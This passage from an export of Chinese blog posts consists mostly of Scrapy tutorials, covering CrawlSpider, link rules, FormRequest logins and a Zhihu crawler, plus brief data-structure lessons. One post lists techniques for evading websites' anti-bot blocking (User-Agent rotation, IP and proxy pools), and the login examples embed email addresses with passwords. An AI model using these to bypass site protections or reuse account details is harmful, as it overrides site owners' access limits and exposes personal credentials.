scrapy.Request(url, callback=self.parse)\n6. Request对象经过调度，执行生成 scrapy.http.response()的响应对象，并送回给parse()方法，直到调度器中没有Request（递归的思路）\n7. 取尽之后，parse()工作结束，引擎再根据队列和pipelines中的内容去执行相应的操作；\n8. 程序在取得各个页面的items前，会先处理完之前所有的request队列里的请求，然后再提取items。\n7. 这一切的一切，Scrapy引擎和调度器将负责到底。</code></pre>\n                                    </div>", "log_PostTime": 1584891228, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:CrawlSpiders", "log_Intro": "Python:CrawlSpiders", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <blockquote>\n<p>通过下面的命令可以快速创建 CrawlSpider模板 的代码：</p>\n\n<p><code>scrapy genspider -t crawl tencent tencent.com</code></p>\n</blockquote>\n\n<p>上一个案例中，我们通过正则表达式，制作了新的url作为Request请求参数，现在我们可以换个花样...</p>\n\n<p><code>class scrapy.spiders.CrawlSpider</code></p>\n\n<p>它是Spider的派生类，Spider类的设计原则是只爬取start_url列表中的网页，而CrawlSpider类定义了一些规则(rule)来提供跟进link的方便的机制，从爬取的网页中获取link并继续爬取的工作更适合。</p>\n\n<p>源码参考</p>\n\n<pre class=\"has\">\n<code>class CrawlSpider(Spider):\n    rules = ()\n    def __init__(self, *a, **kw):\n        super(CrawlSpider, self).__init__(*a, **kw)\n        self._compile_rules()\n\n    #首先调用parse()来处理start_urls中返回的response对象\n    #parse()则将这些response对象传递给了_parse_response()函数处理，并设置回调函数为parse_start_url()\n    #设置了跟进标志位True\n    #parse将返回item和跟进了的Request对象    \n    def parse(self, response):\n        return self._parse_response(response, self.parse_start_url, cb_kwargs={}, follow=True)\n\n    #处理start_url中返回的response，需要重写\n    def parse_start_url(self, response):\n        return []\n\n    def process_results(self, response, results):\n        return results\n\n    #从response中抽取符合任一用户定义'规则'的链接，并构造成Resquest对象返回\n    def _requests_to_follow(self, response):\n        if not isinstance(response, HtmlResponse):\n            return\n        seen = set()\n        #抽取之内的所有链接，只要通过任意一个'规则'，即表示合法\n        for n, rule in enumerate(self._rules):\n            links = [l for l in rule.link_extractor.extract_links(response) if l not in seen]\n            #使用用户指定的process_links处理每个连接\n            if links and rule.process_links:\n                links = rule.process_links(links)\n            #将链接加入seen集合，为每个链接生成Request对象，并设置回调函数为_repsonse_downloaded()\n            for link in links:\n                seen.add(link)\n                #构造Request对象，并将Rule规则中定义的回调函数作为这个Request对象的回调函数\n                r = Request(url=link.url, callback=self._response_downloaded)\n                r.meta.update(rule=n, link_text=link.text)\n                #对每个Request调用process_request()函数。该函数默认为indentify，即不做任何处理，直接返回该Request.\n                yield rule.process_request(r)\n\n    #处理通过rule提取出的连接，并返回item以及request\n    def _response_downloaded(self, response):\n        rule = self._rules[response.meta['rule']]\n        return self._parse_response(response, rule.callback, rule.cb_kwargs, rule.follow)\n\n    #解析response对象，会用callback解析处理他，并返回request或Item对象\n    def _parse_response(self, response, callback, cb_kwargs, follow=True):\n        #首先判断是否设置了回调函数。（该回调函数可能是rule中的解析函数，也可能是 parse_start_url函数）\n        #如果设置了回调函数（parse_start_url()），那么首先用parse_start_url()处理response对象，\n        #然后再交给process_results处理。返回cb_res的一个列表\n        if callback:\n            #如果是parse调用的，则会解析成Request对象\n            #如果是rule callback，则会解析成Item\n            cb_res = callback(response, **cb_kwargs) or ()\n            cb_res = self.process_results(response, cb_res)\n            for requests_or_item in iterate_spider_output(cb_res):\n                yield requests_or_item\n\n        #如果需要跟进，那么使用定义的Rule规则提取并返回这些Request对象\n        if follow and self._follow_links:\n            #返回每个Request对象\n            for request_or_item in self._requests_to_follow(response):\n                yield request_or_item\n\n    def _compile_rules(self):\n        def get_method(method):\n            if callable(method):\n                return method\n            elif isinstance(method, basestring):\n                return getattr(self, method, None)\n\n        self._rules = [copy.copy(r) for r in self.rules]\n        for rule in self._rules:\n            rule.callback = get_method(rule.callback)\n            rule.process_links = get_method(rule.process_links)\n            rule.process_request = get_method(rule.process_request)\n\n    def set_crawler(self, crawler):\n        super(CrawlSpider, self).set_crawler(crawler)\n        self._follow_links = crawler.settings.getbool('CRAWLSPIDER_FOLLOW_LINKS', True)\n</code></pre>\n\n<p>CrawlSpider继承于Spider类，除了继承过来的属性外（name、allow_domains），还提供了新的属性和方法:</p>\n\n<h2 id=\"linkextractors\">LinkExtractors</h2>\n\n<pre class=\"has\">\n<code>class scrapy.linkextractors.LinkExtractor\n</code></pre>\n\n<p>Link Extractors 的目的很简单: 提取链接｡</p>\n\n<p>每个LinkExtractor有唯一的公共方法是 extract_links()，它接收一个 Response 对象，并返回一个 scrapy.link.Link 对象。</p>\n\n<p>Link Extractors要实例化一次，并且 extract_links 方法会根据不同的 response 调用多次提取链接｡</p>\n\n<pre class=\"has\">\n<code>class scrapy.linkextractors.LinkExtractor(\n    allow = (),\n    deny = (),\n    allow_domains = (),\n    deny_domains = (),\n    deny_extensions = None,\n    restrict_xpaths = (),\n    tags = ('a','area'),\n    attrs = ('href'),\n    canonicalize = True,\n    unique = True,\n    process_value = None\n)\n</code></pre>\n\n<p>主要参数：</p>\n\n<ul><li>\n\t<p><code>allow</code>：满足括号中“正则表达式”的值会被提取，如果为空，则全部匹配。</p>\n\t</li>\n\t<li>\n\t<p><code>deny</code>：与这个正则表达式(或正则表达式列表)不匹配的URL一定不提取。</p>\n\t</li>\n\t<li>\n\t<p><code>allow_domains</code>：会被提取的链接的domains。</p>\n\t</li>\n\t<li>\n\t<p><code>deny_domains</code>：一定不会被提取链接的domains。</p>\n\t</li>\n\t<li>\n\t<p><code>restrict_xpaths</code>：使用xpath表达式，和allow共同作用过滤链接。</p>\n\t</li>\n</ul><h2 id=\"rules\">rules</h2>\n\n<p>在rules中包含一个或多个Rule对象，每个Rule对爬取网站的动作定义了特定操作。如果多个rule匹配了相同的链接，则根据规则在本集合中被定义的顺序，第一个会被使用。</p>\n\n<pre class=\"has\">\n<code>\nclass scrapy.spiders.Rule(\n        link_extractor, \n        callback = None, \n        cb_kwargs = None, \n        follow = None, \n        process_links = None, \n        process_request = None\n)\n</code></pre>\n\n<ul><li>\n\t<p><code>link_extractor</code>：是一个Link Extractor对象，用于定义需要提取的链接。</p>\n\t</li>\n\t<li>\n\t<p><code>callback</code>： 从link_extractor中每获取到链接时，参数所指定的值作为回调函数，该回调函数接受一个response作为其第一个参数。</p>\n\n\t<blockquote>\n\t<p>注意：当编写爬虫规则时，避免使用parse作为回调函数。由于CrawlSpider使用parse方法来实现其逻辑，如果覆盖了 parse方法，crawl spider将会运行失败。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p><code>follow</code>：是一个布尔(boolean)值，指定了根据该规则从response提取的链接是否需要跟进。 如果callback为None，follow 默认设置为True ，否则默认为False。</p>\n\t</li>\n\t<li>\n\t<p><code>process_links</code>：指定该spider中哪个的函数将会被调用，从link_extractor中获取到链接列表时将会调用该函数。该方法主要用来过滤。</p>\n\t</li>\n\t<li>\n\t<p><code>process_request</code>：指定该spider中哪个的函数将会被调用， 该规则提取到每个request时都会调用该函数。 (用来过滤request)</p>\n\t</li>\n</ul><h2 id=\"爬取规则crawling-rules\">爬取规则(Crawling rules)</h2>\n\n<p>继续用腾讯招聘为例，给出配合rule使用CrawlSpider的例子:</p>\n\n<ol><li>\n\t<p>首先运行</p>\n\n\t<pre class=\"has\">\n<code> scrapy shell \"http://hr.tencent.com/position.php?&amp;start=0#a\"\n</code></pre>\n\t</li>\n\t<li>\n\t<p>导入LinkExtractor，创建LinkExtractor实例对象。：</p>\n\n\t<pre class=\"has\">\n<code> from scrapy.linkextractors import LinkExtractor\n\n page_lx = LinkExtractor(allow=('position.php?&amp;start=\\d+'))\n</code></pre>\n\n\t<blockquote>\n\t<p>allow : LinkExtractor对象最重要的参数之一，这是一个正则表达式，必须要匹配这个正则表达式(或正则表达式列表)的URL才会被提取，如果没有给出(或为空), 它会匹配所有的链接｡</p>\n\n\t<p>deny : 用法同allow，只不过与这个正则表达式匹配的URL不会被提取)｡它的优先级高于 allow 的参数，如果没有给出(或None), 将不排除任何链接｡</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>调用LinkExtractor实例的extract_links()方法查询匹配结果：</p>\n\n\t<pre class=\"has\">\n<code> page_lx.extract_links(response)\n</code></pre>\n\t</li>\n\t<li>\n\t<p>没有查到：</p>\n\n\t<pre class=\"has\">\n<code> []\n</code></pre>\n\t</li>\n\t<li>\n\t<p>注意转义字符的问题，继续重新匹配：</p>\n\n\t<pre class=\"has\">\n<code> page_lx = LinkExtractor(allow=('position\\.php\\?&amp;start=\\d+'))\n # page_lx = LinkExtractor(allow = ('start=\\d+'))\n\n page_lx.extract_links(response)\n</code></pre>\n\t</li>\n</ol><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019110512042144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<h2 id=\"crawlspider-版本\">CrawlSpider 版本</h2>\n\n<p>那么，scrapy shell测试完成之后，修改以下代码</p>\n\n<pre class=\"has\">\n<code>#提取匹配 'http://hr.tencent.com/position.php?&amp;start=\\d+'的链接\npage_lx = LinkExtractor(allow = ('start=\\d+'))\n\nrules = [\n    #提取匹配,并使用spider的parse方法进行分析;并跟进链接(没有callback意味着follow默认为True)\n    Rule(page_lx, callback = 'parse', follow = True)\n]\n</code></pre>\n\n<p><strong>这么写对吗？</strong></p>\n\n<p><strong>不对！千万记住 callback 千万不能写 parse，再次强调：由于CrawlSpider使用parse方法来实现其逻辑，如果覆盖了 parse方法，crawl spider将会运行失败。</strong></p>\n\n<pre class=\"has\">\n<code>#tencent.py\n\nimport scrapy\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom scrapy.linkextractors import LinkExtractor\nfrom mySpider.items import TencentItem\n\nclass TencentSpider(CrawlSpider):\n    name = \"tencent\"\n    allowed_domains = [\"hr.tencent.com\"]\n    start_urls = [\n        \"http://hr.tencent.com/position.php?&amp;start=0#a\"\n    ]\n\n    page_lx = LinkExtractor(allow=(\"start=\\d+\"))\n\n    rules = [\n        Rule(page_lx, callback = \"parseContent\", follow = True)\n    ]\n\n    def parseContent(self, response):\n        for each in response.xpath('//*[@class=\"even\"]'):\n            name = each.xpath('./td[1]/a/text()').extract()[0]\n            detailLink = each.xpath('./td[1]/a/@href').extract()[0]\n            positionInfo = each.xpath('./td[2]/text()').extract()[0]\n\n            peopleNumber = each.xpath('./td[3]/text()').extract()[0]\n            workLocation = each.xpath('./td[4]/text()').extract()[0]\n            publishTime = each.xpath('./td[5]/text()').extract()[0]\n            #print name, detailLink, catalog,recruitNumber,workLocation,publishTime\n\n            item = TencentItem()\n            item['name']=name.encode('utf-8')\n            item['detailLink']=detailLink.encode('utf-8')\n            item['positionInfo']=positionInfo.encode('utf-8')\n            item['peopleNumber']=peopleNumber.encode('utf-8')\n            item['workLocation']=workLocation.encode('utf-8')\n            item['publishTime']=publishTime.encode('utf-8')\n\n            yield item\n\n    # parse() 方法不需要写     \n    # def parse(self, response):                                              \n    #     pass\n</code></pre>\n\n<p>运行： <code>scrapy crawl tencent</code></p>\n\n<h2 id=\"logging\">Logging</h2>\n\n<p>Scrapy提供了log功能，可以通过 logging 模块使用。</p>\n\n<blockquote>\n<p>可以修改配置文件settings.py，任意位置添加下面两行，效果会清爽很多。</p>\n</blockquote>\n\n<pre class=\"has\">\n<code>LOG_FILE = \"TencentSpider.log\"\nLOG_LEVEL = \"INFO\"\n</code></pre>\n\n<p>Log levels</p>\n\n<ul><li>\n\t<p>Scrapy提供5层logging级别:</p>\n\t</li>\n\t<li>\n\t<p>CRITICAL - 严重错误(critical)</p>\n\t</li>\n\t<li>ERROR - 一般错误(regular errors)</li>\n\t<li>WARNING - 警告信息(warning messages)</li>\n\t<li>INFO - 一般信息(informational messages)</li>\n\t<li>DEBUG - 调试信息(debugging messages)</li>\n</ul><p>logging设置</p>\n\n<p>通过在setting.py中进行以下设置可以被用来配置logging:</p>\n\n<ol><li><code>LOG_ENABLED</code> 默认: True，启用logging</li>\n\t<li><code>LOG_ENCODING</code> 默认: 'utf-8'，logging使用的编码</li>\n\t<li><code>LOG_FILE</code> 默认: None，在当前目录里创建logging输出文件的文件名</li>\n\t<li><code>LOG_LEVEL</code> 默认: 'DEBUG'，log的最低级别</li>\n\t<li><code>LOG_STDOUT</code> 默认: False 如果为 True，进程所有的标准输出(及错误)将会被重定向到log中。例如，执行 print \"hello\" ，其将会在Scrapy log中显示。</li>\n</ol>                                    </div>", "log_PostTime": 1584891230, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "常用数据结构讲解与案例分析", "log_Intro": "常用数据结构讲解与案例分析", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>数据结构是算法的基石，如果没有扎实的数据结构基础，想要把算法学好甚至融会贯通是非常困难的，而优秀的算法又往往取决于你采用哪种数据结构。</p>\n\n<p> </p>\n\n<p>所以，接下来两节课的主题是，在算法面试中经常会被用到的数据结构以及一些实用技巧。同时穿插一些经典的题目，加深理解。这节课主要讲：</p>\n\n<ul><li>\n\t<p>数组、字符串</p>\n\t</li>\n\t<li>\n\t<p>链表</p>\n\t</li>\n\t<li>\n\t<p>栈</p>\n\t</li>\n\t<li>\n\t<p>队列</p>\n\t</li>\n\t<li>\n\t<p>双端队列</p>\n\t</li>\n\t<li>\n\t<p>树</p>\n\t</li>\n</ul><h1> </h1>\n\n<p>数组、字符串（Array &amp; String）</p>\n\n<h2> </h2>\n\n<p>字符串转化</p>\n\n<p>数组和字符串是最基本的数据结构，在很多编程语言中都有着十分相似的性质，而围绕着它们的算法面试题也是最多的。</p>\n\n<p> </p>\n\n<p>很多时候，在分析字符串相关面试题的过程中，我们往往要针对字符串当中的每一个字符进行分析和处理，甚至有时候我们得先把给定的字符串转换成字符数组之后再进行分析和处理。</p>\n\n<p> </p>\n\n<p><strong>举例：</strong>翻转字符串“algorithm”。</p>\n\n<p> </p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5sZ3N0YXRpYy5jb20vaS9pbWFnZTIvTTAxLzkwL0NBL0Nnb0I1bDJJUmlDQVRqNUxBR0phNjlCdFFSQTM1Ny5naWY\"></p>\n\n<p>      </p>\n\n<p><strong>解法：</strong>用两个指针，一个指向字符串的第一个字符 a，一个指向它的最后一个字符 m，然后互相交换。交换之后，两个指针向中央一步步地靠拢并相互交换字符，直到两个指针相遇。这是一种比较快速和直观的方法。</p>\n\n<p> </p>\n\n<p><strong>注意：</strong>由于无法直接修改字符串里的字符，所以必须先把字符串变换为</p>                                    </div>", "log_PostTime": 1584891231, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "高级数据结构讲解与案例分析", "log_Intro": "高级数据结构讲解与案例分析", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>然而，仅仅掌握好它们不足以应付大厂的算法面试的。为了达到对时间和空间复杂度的理想要求，本节课探究高级数据结构，它们的实现要比那些常用的数据结构要复杂得多。其中重点介绍：</p>\n\n<ul><li>\n\t<p>优先队列</p>\n\t</li>\n\t<li>\n\t<p>图</p>\n\t</li>\n\t<li>\n\t<p>前缀树</p>\n\t</li>\n\t<li>\n\t<p>线段树</p>\n\t</li>\n\t<li>\n\t<p>树状数组</p>\n\t</li>\n</ul><p> </p>\n\n<p>掌握好高级数据结构的性质以及所适用的场合，在分析问题的时候回归本质，很多题目都能迎刃而解。</p>\n\n<h1> </h1>\n\n<p>优先队列（Priority Queue）</p>\n\n<h3> </h3>\n\n<p>特点</p>\n\n<p>能保证每次取出的元素都是队列中优先级别最高的。优先级别可以是自定义的，例如，数据的数值越大，优先级越高；或者数据的数值越小，优先级越高。优先级别甚至可以通过各种复杂的计算得到。</p>\n\n<h3> </h3>\n\n<p>应用场景</p>\n\n<p>从一堆杂乱无章的数据当中按照一定的顺序（或者优先级）逐步地筛选出部分乃至全部的数据。</p>\n\n<p> </p>\n\n<p><strong>举例</strong>：任意一个数组，找出前 k 大的数。</p>\n\n<p> </p>\n\n<p><strong>解法 1</strong>：先对这个数组进行排序，然后依次输出前 k 大的数，复杂度将会是 O(nlogn)，其中，n 是数组的元素个数。这是一种直接的办法。</p>\n\n<p> </p>\n\n<p><strong>解法 2</strong>：使用优先队列，复杂度优化成 O(k + nlogk)。</p>\n\n<p>当数据量很大（即 n 很大），而 k 相对较小的时候，显然，利用优先队列能有效地降低算法复杂度。因为要找出前 k 大的数，并不需要对所有的数进行排序。</p>\n\n<h3> </h3>\n\n<p>实现</p>\n\n<p>优先队列的本质是一个二叉堆结构。堆在英文里叫 Binary Heap，它是利用一个数组结构来实现的完全二叉树。换句话说，优先队列的本质是一个数组，数组里的每个元素既有可能是其他元素的父节点，也有可能是其他元素的子节点，而且，每个父节点只能有两个子节点，很像一棵二叉树</p>                                    </div>", "log_PostTime": 1584891233, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Resquest/Response", "log_Intro": "Python:Resquest/Response", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>Request</h3>\n\n<p>Request 部分源码：</p>\n\n<pre class=\"has\">\n<code class=\"language-python\"># 部分代码\nclass Request(object_ref):\n\n    def __init__(self, url, callback=None, method='GET', headers=None, body=None, \n                 cookies=None, meta=None, encoding='utf-8', priority=0,\n                 dont_filter=False, errback=None):\n\n        self._encoding = encoding  # this one has to be set first\n        self.method = str(method).upper()\n        self._set_url(url)\n        self._set_body(body)\n        assert isinstance(priority, int), \"Request priority not an integer: %r\" % priority\n        self.priority = priority\n\n        assert callback or not errback, \"Cannot use errback without a callback\"\n        self.callback = callback\n        self.errback = errback\n\n        self.cookies = cookies or {}\n        self.headers = Headers(headers or {}, encoding=encoding)\n        self.dont_filter = dont_filter\n\n        self._meta = dict(meta) if meta else None\n\n    @property\n    def meta(self):\n        if self._meta is None:\n            self._meta = {}\n        return self._meta\n</code></pre>\n\n<p>其中，比较常用的参数：</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">url: 就是需要请求，并进行下一步处理的url\n\ncallback: 指定该请求返回的Response，由那个函数来处理。\n\nmethod: 请求一般不需要指定，默认GET方法，可设置为\"GET\", \"POST\", \"PUT\"等，且保证字符串大写\n\nheaders: 请求时，包含的头文件。一般不需要。内容一般如下：\n        # 自己写过爬虫的肯定知道\n        Host: media.readthedocs.org\n        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0\n        Accept: text/css,*/*;q=0.1\n        Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\n        Accept-Encoding: gzip, deflate\n        Referer: http://scrapy-chs.readthedocs.org/zh_CN/0.24/\n        Cookie: _ga=GA1.2.1612165614.1415584110;\n        Connection: keep-alive\n        If-Modified-Since: Mon, 25 Aug 2014 21:59:35 GMT\n        Cache-Control: max-age=0\n\nmeta: 比较常用，在不同的请求之间传递数据使用的。字典dict型\n\n        request_with_cookies = Request(\n            url=\"http://www.example.com\",\n            cookies={'currency': 'USD', 'country': 'UY'},\n            meta={'dont_merge_cookies': True}\n        )\n\nencoding: 使用默认的 'utf-8' 就行。\n\ndont_filter: 表明该请求不由调度器过滤。这是当你想使用多次执行相同的请求,忽略重复的过滤器。默认为False。\n\nerrback: 指定错误处理函数\n</code></pre>\n\n<h3 id=\"response\">Response</h3>\n\n<pre class=\"has\">\n<code class=\"language-python\"># 部分代码\nclass Response(object_ref):\n    def __init__(self, url, status=200, headers=None, body='', flags=None, request=None):\n        self.headers = Headers(headers or {})\n        self.status = int(status)\n        self._set_body(body)\n        self._set_url(url)\n        self.request = request\n        self.flags = [] if flags is None else list(flags)\n\n    @property\n    def meta(self):\n        try:\n            return self.request.meta\n        except AttributeError:\n            raise AttributeError(\"Response.meta not available, this response \" \\\n                \"is not tied to any request\")\n</code></pre>\n\n<p>大部分参数和上面的差不多：</p>\n\n<pre class=\"has\">\n<code>\nstatus: 响应码\n_set_body(body)： 响应体\n_set_url(url)：响应url\nself.request = request\n</code></pre>\n\n<h2 id=\"发送post请求\">发送POST请求</h2>\n\n<ul><li>\n\t<p>可以使用 <code>yield scrapy.FormRequest(url, formdata, callback)</code>方法发送POST请求。</p>\n\t</li>\n\t<li>\n\t<p>如果希望程序执行一开始就发送POST请求，可以重写Spider类的<code>start_requests(self)</code> 方法，并且不再调用start_urls里的url。</p>\n\t</li>\n</ul><pre class=\"has\">\n<code class=\"language-python\">class mySpider(scrapy.Spider):\n    # start_urls = [\"http://www.example.com/\"]\n\n    def start_requests(self):\n        url = 'http://www.renren.com/PLogin.do'\n\n        # FormRequest 是Scrapy发送POST请求的方法\n        yield scrapy.FormRequest(\n            url = url,\n            formdata = {\"email\" : \"mr_mao_hacker@163.com\", \"password\" : \"axxxxxxxe\"},\n            callback = self.parse_page\n        )\n    def parse_page(self, response):\n        # do something\n</code></pre>\n\n<h2 id=\"模拟登陆\">模拟登陆</h2>\n\n<p>使用FormRequest.from_response()方法<a href=\"http://docs.pythontab.com/scrapy/scrapy0.24/topics/request-response.html#topics-request-response-ref-request-userlogin\" rel=\"nofollow\">模拟用户登录</a></p>\n\n<blockquote>\n<p>通常网站通过 实现对某些表单字段（如数据或是登录界面中的认证令牌等）的预填充。</p>\n\n<p>使用Scrapy抓取网页时，如果想要预填充或重写像用户名、用户密码这些表单字段， 可以使用 FormRequest.from_response() 方法实现。</p>\n\n<p>下面是使用这种方法的爬虫例子:</p>\n</blockquote>\n\n<pre class=\"has\">\n<code class=\"language-python\">import scrapy\n\nclass LoginSpider(scrapy.Spider):\n    name = 'example.com'\n    start_urls = ['http://www.example.com/users/login.php']\n\n    def parse(self, response):\n        return scrapy.FormRequest.from_response(\n            response,\n            formdata={'username': 'john', 'password': 'secret'},\n            callback=self.after_login\n        )\n\n    def after_login(self, response):\n        # check login succeed before going on\n        if \"authentication failed\" in response.body:\n            self.log(\"Login failed\", level=log.ERROR)\n            return\n\n        # continue scraping with authenticated session...\n</code></pre>\n\n<h2 id=\"知乎爬虫案例参考：\">知乎爬虫案例参考：</h2>\n\n<p>zhihuSpider.py爬虫代码</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">#!/usr/bin/env python\n# -*- coding:utf-8 -*-\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom scrapy.selector import Selector\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy import Request, FormRequest\nfrom zhihu.items import ZhihuItem\n\nclass ZhihuSipder(CrawlSpider) :\n    name = \"zhihu\"\n    allowed_domains = [\"www.zhihu.com\"]\n    start_urls = [\n        \"http://www.zhihu.com\"\n    ]\n    rules = (\n        Rule(LinkExtractor(allow = ('/question/\\d+#.*?', )), callback = 'parse_page', follow = True),\n        Rule(LinkExtractor(allow = ('/question/\\d+', )), callback = 'parse_page', follow = True),\n    )\n\n    headers = {\n    \"Accept\": \"*/*\",\n    \"Accept-Encoding\": \"gzip,deflate\",\n    \"Accept-Language\": \"en-US,en;q=0.8,zh-TW;q=0.6,zh;q=0.4\",\n    \"Connection\": \"keep-alive\",\n    \"Content-Type\":\" application/x-www-form-urlencoded; charset=UTF-8\",\n    \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36\",\n    \"Referer\": \"http://www.zhihu.com/\"\n    }\n\n    #重写了爬虫类的方法, 实现了自定义请求, 运行成功后会调用callback回调函数\n    def start_requests(self):\n        return [Request(\"https://www.zhihu.com/login\", meta = {'cookiejar' : 1}, callback = self.post_login)]\n\n    def post_login(self, response):\n        print 'Preparing login'\n        #下面这句话用于抓取请求网页后返回网页中的_xsrf字段的文字, 用于成功提交表单\n        xsrf = Selector(response).xpath('//input[@name=\"_xsrf\"]/@value').extract()[0]\n        print xsrf\n        #FormRequeset.from_response是Scrapy提供的一个函数, 用于post表单\n        #登陆成功后, 会调用after_login回调函数\n        return [FormRequest.from_response(response,   #\"http://www.zhihu.com/login\",\n                            meta = {'cookiejar' : response.meta['cookiejar']},\n                            headers = self.headers,  #注意此处的headers\n                            formdata = {\n                            '_xsrf': xsrf,\n                            'email': '1095511864@qq.com',\n                            'password': '123456'\n                            },\n                            callback = self.after_login,\n                            dont_filter = True\n                            )]\n\n    def after_login(self, response) :\n        for url in self.start_urls :\n            yield self.make_requests_from_url(url)\n\n    def parse_page(self, response):\n        problem = Selector(response)\n        item = ZhihuItem()\n        item['url'] = response.url\n        item['name'] = problem.xpath('//span[@class=\"name\"]/text()').extract()\n        print item['name']\n        item['title'] = problem.xpath('//h2[@class=\"zm-item-title zm-editable-content\"]/text()').extract()\n        item['description'] = problem.xpath('//div[@class=\"zm-editable-content\"]/text()').extract()\n        item['answer']= problem.xpath('//div[@class=\" zm-editable-content clearfix\"]/text()').extract()\n        return item\n</code></pre>\n\n<p>Item类设置</p>\n\n<pre class=\"has\">\n<code>from scrapy.item import Item, Field\n\nclass ZhihuItem(Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    url = Field()  #保存抓取问题的url\n    title = Field()  #抓取问题的标题\n    description = Field()  #抓取问题的描述\n    answer = Field()  #抓取问题的答案\n    name = Field()  #个人用户的名称\n</code></pre>\n\n<p>setting.py 设置抓取间隔</p>\n\n<pre class=\"has\">\n<code>BOT_NAME = 'zhihu'\n\nSPIDER_MODULES = ['zhihu.spiders']\nNEWSPIDER_MODULE = 'zhihu.spiders'\nDOWNLOAD_DELAY = 0.25   #设置下载间隔为250ms</code></pre>\n                                    </div>", "log_PostTime": 1584891234, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Downloader Middlewares", "log_Intro": "Python:Downloader Middlewares", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"反反爬虫相关机制\">反反爬虫相关机制</h2>\n\n<p>Some websites implement certain measures to prevent bots from crawling them, with varying degrees of sophistication. Getting around those measures can be difficult and tricky, and may sometimes require special infrastructure. Please consider contacting commercial support if in doubt.</p>\n\n<p>(有些些网站使用特定的不同程度的复杂性规则防止爬虫访问，绕过这些规则是困难和复杂的，有时可能需要特殊的基础设施，如果有疑问，请联系商业支持。)</p>\n\n<blockquote>\n<p>来自于Scrapy官方文档描述：<a href=\"http://doc.scrapy.org/en/master/topics/practices.html#avoiding-getting-banned\" rel=\"nofollow\">http://doc.scrapy.org/en/master/topics/practices.html#avoiding-getting-banned</a></p>\n</blockquote>\n\n<h3 id=\"通常防止爬虫被反主要有以下几个策略：\">通常防止爬虫被反主要有以下几个策略：</h3>\n\n<ul><li>\n\t<p>动态设置User-Agent（随机切换User-Agent，模拟不同用户的浏览器信息）</p>\n\t</li>\n\t<li>\n\t<p>禁用Cookies（也就是不启用cookies middleware，不向Server发送cookies，有些网站通过cookie的使用发现爬虫行为）</p>\n\n\t<ul><li>可以通过<code>COOKIES_ENABLED</code> 控制 CookiesMiddleware 开启或关闭</li>\n\t</ul></li>\n\t<li>\n\t<p>设置延迟下载（防止访问过于频繁，设置为 2秒 或更高）</p>\n\t</li>\n\t<li>\n\t<p>Google Cache 和 Baidu Cache：如果可能的话，使用谷歌/百度等搜索引擎服务器页面缓存获取页面数据。</p>\n\t</li>\n\t<li>\n\t<p>使用IP地址池：VPN和代理IP，现在大部分网站都是根据IP来ban的。</p>\n\t</li>\n\t<li>\n\t<p>使用 <a href=\"https://scrapinghub.com/crawlera\" rel=\"nofollow\">Crawlera</a>（专用于爬虫的代理组件），正确配置和设置下载中间件后，项目所有的request都是通过crawlera发出。</p>\n\n\t<pre class=\"has\">\n<code>  DOWNLOADER_MIDDLEWARES = {\n      'scrapy_crawlera.CrawleraMiddleware': 600\n  }\n\n  CRAWLERA_ENABLED = True\n  CRAWLERA_USER = '注册/购买的UserKey'\n  CRAWLERA_PASS = '注册/购买的Password'\n</code></pre>\n\t</li>\n</ul><h2 id=\"设置下载中间件（downloader-middlewares）\">设置下载中间件（Downloader Middlewares）</h2>\n\n<p>下载中间件是处于引擎(crawler.engine)和下载器(crawler.engine.download())之间的一层组件，可以有多个下载中间件被加载运行。</p>\n\n<ol><li>\n\t<p>当引擎传递请求给下载器的过程中，下载中间件可以对请求进行处理 （例如增加http header信息，增加proxy信息等）；</p>\n\t</li>\n\t<li>\n\t<p>在下载器完成http请求，传递响应给引擎的过程中， 下载中间件可以对响应进行处理（例如进行gzip的解压等）</p>\n\t</li>\n</ol><p>要激活下载器中间件组件，将其加入到 DOWNLOADER_MIDDLEWARES 设置中。 该设置是一个字典(dict)，键为中间件类的路径，值为其中间件的顺序(order)。</p>\n\n<p>这里是一个例子:</p>\n\n<pre class=\"has\">\n<code>DOWNLOADER_MIDDLEWARES = {\n    'mySpider.middlewares.MyDownloaderMiddleware': 543,\n}\n</code></pre>\n\n<p>编写下载器中间件十分简单。每个中间件组件是一个定义了以下一个或多个方法的Python类:</p>\n\n<pre class=\"has\">\n<code>class scrapy.contrib.downloadermiddleware.DownloaderMiddleware\n</code></pre>\n\n<h3 id=\"processrequestself-request-spider\">process_request(self, request, spider)</h3>\n\n<ul><li>\n\t<p>当每个request通过下载中间件时，该方法被调用。</p>\n\t</li>\n\t<li>\n\t<p>process_request() 必须返回以下其中之一：一个 None 、一个 Response 对象、一个 Request 对象或 raise IgnoreRequest:</p>\n\n\t<ul><li>\n\t\t<p>如果其返回 None 